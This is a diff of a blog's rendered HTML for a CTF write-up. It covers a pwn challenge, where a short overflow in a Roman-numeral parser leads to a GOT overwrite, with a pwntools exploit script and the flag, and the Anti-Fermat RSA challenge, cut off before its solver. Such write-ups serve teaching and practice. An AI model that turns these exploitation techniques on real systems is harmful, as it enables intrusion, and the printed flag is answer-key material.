 <p>At a glance, seems like there isn&rsquo;t anything wrong with the code. But there is a subtle bug on there. See the roman conversion method below:</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">short</span> <span style="color:#c0f">readroman</span>(){
-</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">short</span> res <span style="color:#555">=</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>  std<span style="color:#555">::</span>string s;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  std<span style="color:#555">::</span>cin <span style="color:#555">&gt;&gt;</span> s;
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">auto</span> it <span style="color:#555">=</span> s.crbegin();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> b <span style="color:#555">=</span> <span style="color:#f60">1</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">for</span> (<span style="color:#069;font-weight:bold">auto</span> <span style="color:#99f">c</span>: <span style="color:#c30">&#34;IXCM&#34;</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#078;font-weight:bold">int</span> cnt <span style="color:#555">=</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">while</span> (cnt <span style="color:#555">&lt;</span> <span style="color:#f60">9</span> <span style="color:#555">&amp;&amp;</span> it <span style="color:#555">!=</span> s.crend() <span style="color:#555">&amp;&amp;</span> <span style="color:#555">*</span>it <span style="color:#555">==</span> c) {
-</span></span><span style="display:flex;"><span>      it<span style="color:#555">++</span>;
-</span></span><span style="display:flex;"><span>      cnt<span style="color:#555">++</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    res <span style="color:#555">+=</span> b <span style="color:#555">*</span> cnt;
-</span></span><span style="display:flex;"><span>    b <span style="color:#555">*=</span> <span style="color:#f60">10</span>;
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> res;
-</span></span><span style="display:flex;"><span>}
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">short</span> <span class="nf">readroman</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">short</span> <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">auto</span> <span class="n">it</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">crbegin</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="nl">c</span><span class="p">:</span> <span class="s">&#34;IXCM&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">cnt</span> <span class="o">&lt;</span> <span class="mi">9</span> <span class="o">&amp;&amp;</span> <span class="n">it</span> <span class="o">!=</span> <span class="n">s</span><span class="p">.</span><span class="n">crend</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">it</span> <span class="o">==</span> <span class="n">c</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">it</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">cnt</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">+=</span> <span class="n">b</span> <span class="o">*</span> <span class="n">cnt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">*=</span> <span class="mi">10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>The first idea is of course to overflow the <code>res</code> variable. In order to do that, we need to be able to send Roman value larger than $32767$. However, it seems like impossible to do that, because seems like the maximum value that can be returned by the <code>readroman</code> function is $9999$.
 In C, string is ended with <code>\0</code>, which mean during iterating string &ldquo;IXCM&rdquo; with auto, <code>\0</code> will be iterated also, henc the maximum value that can be returned by the method is not $9999$, but $99999$, which is enough to overflow the <code>res</code> variable.</p>
 <p>My solution is to overwrite the GOT value of <code>exit</code> by <code>win</code> address. The exit GOT location is at <code>0x404058</code>, which mean to overwrite it, we will need to assign the <code>win</code> address value to <code>buf[(0x404340 - 0x404058) // 2]</code> (Need to divide it by $2$ because buf is array of <code>short</code> type element). Also another note is that, we only need to overwrite the last two-bytes of the <code>exit</code> GOT value (because the third lsb is already the same, which is <code>0x40</code>)</p>
 <p>Below is the solver:</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> p64, u64, p32, u32
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
-</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
-</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
-</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>offset <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span><span style="color:#555">*</span><span style="color:#f60">6</span><span style="color:#555">+</span><span style="color:#c30">b</span><span style="color:#c30">&#39;M&#39;</span><span style="color:#555">*</span><span style="color:#f60">5</span><span style="color:#555">+</span><span style="color:#c30">b</span><span style="color:#c30">&#39;C&#39;</span><span style="color:#555">*</span><span style="color:#f60">1</span><span style="color:#555">+</span><span style="color:#c30">b</span><span style="color:#c30">&#39;X&#39;</span><span style="color:#555">*</span><span style="color:#f60">6</span><span style="color:#555">+</span><span style="color:#c30">b</span><span style="color:#c30">&#39;I&#39;</span><span style="color:#555">*</span><span style="color:#f60">4</span>
-</span></span><span style="display:flex;"><span>win <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;M&#39;</span><span style="color:#555">*</span><span style="color:#f60">4</span><span style="color:#555">+</span><span style="color:#c30">b</span><span style="color:#c30">&#39;C&#39;</span><span style="color:#555">*</span><span style="color:#f60">8</span><span style="color:#555">+</span><span style="color:#c30">b</span><span style="color:#c30">&#39;X&#39;</span><span style="color:#555">*</span><span style="color:#f60">5</span><span style="color:#555">+</span><span style="color:#c30">b</span><span style="color:#c30">&#39;I&#39;</span><span style="color:#555">*</span><span style="color:#f60">4</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> remote(<span style="color:#c30">&#39;pwn1.ctf.zer0pts.com&#39;</span>, <span style="color:#f60">9000</span>)
-</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;ind: &#39;</span>, offset)
-</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;val: &#39;</span>, win)
-</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">6</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;M&#39;</span><span class="o">*</span><span class="mi">5</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;C&#39;</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;X&#39;</span><span class="o">*</span><span class="mi">6</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;I&#39;</span><span class="o">*</span><span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">win</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;M&#39;</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;C&#39;</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;X&#39;</span><span class="o">*</span><span class="mi">5</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;I&#39;</span><span class="o">*</span><span class="mi">4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn1.ctf.zer0pts.com&#39;</span><span class="p">,</span> <span class="mi">9000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;ind: &#39;</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;val: &#39;</span><span class="p">,</span> <span class="n">win</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
 <p>Flag: zer0pts{R0me_w1ll_3x1st_a5_1on9_4s_th3_Col1s3um_d0es}</p>
 </blockquote>
-<h1 id="crypto">Crypto <a href="#crypto" class="anchor">#</a></h1>
-<h2 id="anti-fermat">Anti-Fermat <a href="#anti-fermat" class="anchor">#</a></h2>
+<h1 id="crypto">Crypto</h1>
+<h2 id="anti-fermat">Anti-Fermat</h2>
 <p>Below is the source code of the chall:</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.number</span> <span style="color:#069;font-weight:bold">import</span> isPrime, getStrongPrime
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">gmpy</span> <span style="color:#069;font-weight:bold">import</span> next_prime
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">secret</span> <span style="color:#069;font-weight:bold">import</span> flag
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Anti-Fermat Key Generation</span>
-</span></span><span style="display:flex;"><span>p <span style="color:#555">=</span> getStrongPrime(<span style="color:#f60">1024</span>)
-</span></span><span style="display:flex;"><span>q <span style="color:#555">=</span> next_prime(p <span style="color:#555">^</span> ((<span style="color:#f60">1</span><span style="color:#555">&lt;&lt;</span><span style="color:#f60">1024</span>)<span style="color:#555">-</span><span style="color:#f60">1</span>))
-</span></span><span style="display:flex;"><span>n <span style="color:#555">=</span> p <span style="color:#555">*</span> q
-</span></span><span style="display:flex;"><span>e <span style="color:#555">=</span> <span style="color:#f60">65537</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Encryption</span>
-</span></span><span style="display:flex;"><span>m <span style="color:#555">=</span> <span style="color:#366">int</span><span style="color:#555">.</span>from_bytes(flag, <span style="color:#c30">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">assert</span> m <span style="color:#555">&lt;</span> n
-</span></span><span style="display:flex;"><span>c <span style="color:#555">=</span> <span style="color:#366">pow</span>(m, e, n)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">&#39;n = </span><span style="color:#a00">{}</span><span style="color:#c30">&#39;</span><span style="color:#555">.</span>format(<span style="color:#366">hex</span>(n)))
-</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">&#39;c = </span><span style="color:#a00">{}</span><span style="color:#c30">&#39;</span><span style="color:#555">.</span>format(<span style="color:#366">hex</span>(c)))
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">isPrime</span><span class="p">,</span> <span class="n">getStrongPrime</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">gmpy</span> <span class="kn">import</span> <span class="n">next_prime</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Anti-Fermat Key Generation</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">getStrongPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">q</span> <span class="o">=</span> <span class="n">next_prime</span><span class="p">(</span><span class="n">p</span> <span class="o">^</span> <span class="p">((</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">1024</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Encryption</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">m</span> <span class="o">&lt;</span> <span class="n">n</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;n = </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">n</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;c = </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>Through observations, we can see that $p+q$ value is actually bruteforce-able. If we see on how $q$ is generated, $q$ is basically we flip $p$ bits and increase it until it is a prime. So,
@@ -371,212 +369,86 @@ $$
 \end{align}
 $$</p>
 <p>To solve this chall, we just need to bruteforce $p+q$ based on first equation, and then try to decrypt the $c$ with the calculated $\varphi(n)$. Below is my solver (I use sagemath).</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+<div class="highlight"><div class="chroma">
